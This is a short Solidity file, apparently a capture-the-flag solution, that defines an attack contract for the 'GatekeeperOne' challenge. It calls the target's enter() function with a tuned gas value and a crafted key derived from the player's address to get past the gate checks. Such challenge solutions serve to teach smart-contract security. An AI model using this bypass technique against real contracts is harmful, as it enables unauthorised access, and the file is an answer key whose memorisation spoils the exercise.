pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract Attack_GatekeeperOne {

    GatekeeperOne public target;

    constructor(address _targetAddress) {
        target = GatekeeperOne(_targetAddress);
    }

    // key is a 8 byte value in hex where the first half-byte is 1 and the last 4 bytes are the last 4 bytes of the players address, e.g. "0x10000000000067F2"
    function attack(bytes8 key) public {
        target.enter{gas: 24829}(key);
    }

}
